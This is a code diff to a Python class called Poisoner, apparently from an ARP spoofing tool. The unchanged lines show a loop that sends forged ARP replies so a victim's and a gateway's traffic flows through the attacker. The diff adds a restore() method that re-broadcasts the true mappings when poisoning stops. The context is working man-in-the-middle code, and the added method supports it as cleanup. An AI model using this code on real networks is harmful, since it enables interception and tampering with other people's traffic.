@@ -62,6 +62,11 @@ class Poisoner(threading.Thread):
         self.set_parameters(victimIP, victimMAC, gatewayIP, gatewayMAC)
         self.running = True
 
+    def restore(self):
+        send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3, verbose=0)
+        send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3, verbose=0)
+        self.log.info("ip resored")
+
     def set_parameters(self, victimIP, victimMAC, gatewayIP, gatewayMAC):
         self.victimIP = victimIP
         self.victimMAC = victimMAC
@@ -75,6 +80,7 @@ class Poisoner(threading.Thread):
             send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst=self.victimMAC), verbose=0)
             send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst=self.gatewayMAC), verbose=0)
             time.sleep(self.config.get('poison').get('delay'))
+        self.restore()
 
     def stop(self):
         self.running = False
